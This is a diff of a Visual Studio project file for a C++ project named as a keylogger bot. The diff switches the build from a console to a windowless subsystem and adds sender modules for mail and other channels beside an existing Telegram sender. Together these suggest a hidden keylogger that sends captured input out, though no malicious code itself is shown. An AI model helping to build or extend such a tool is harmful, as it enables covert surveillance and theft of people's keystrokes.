@@ -111,7 +111,7 @@
       <LanguageStandard>stdcpp20</LanguageStandard>
     </ClCompile>
     <Link>
-      <SubSystem>Console</SubSystem>
+      <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <AdditionalLibraryDirectories>D:\Bot_cpp_lib\SFML-2.6.1\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
       <AdditionalDependencies>sfml-graphics-d.lib;sfml-window-d.lib;sfml-system-d.lib;sfml-network-d.lib;sfml-audio-d.lib;%(AdditionalDependencies)</AdditionalDependencies>
@@ -135,15 +135,21 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="ConsoleApplication_MEI_keylogger_bot.cpp" />
+    <ClCompile Include="FabricSender.cpp" />
     <ClCompile Include="GUI.cpp" />
     <ClCompile Include="Logger.cpp" />
+    <ClCompile Include="MailSender.cpp" />
+    <ClCompile Include="Sender.cpp" />
     <ClCompile Include="TGSender.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="FabricSender.h" />
     <ClInclude Include="GUI.h" />
     <ClInclude Include="Logger.h" />
+    <ClInclude Include="MailSender.h" />
     <ClInclude Include="resource.h" />
-    <ClInclude Include="TGSender.h" />
+    <ClInclude Include="Sender.h" />
+    <ClInclude Include="TgSender.h" />
   </ItemGroup>
   <ItemGroup>
     <ResourceCompile Include="ConsoleApplication_MEI_keylogger_bot.rc" />
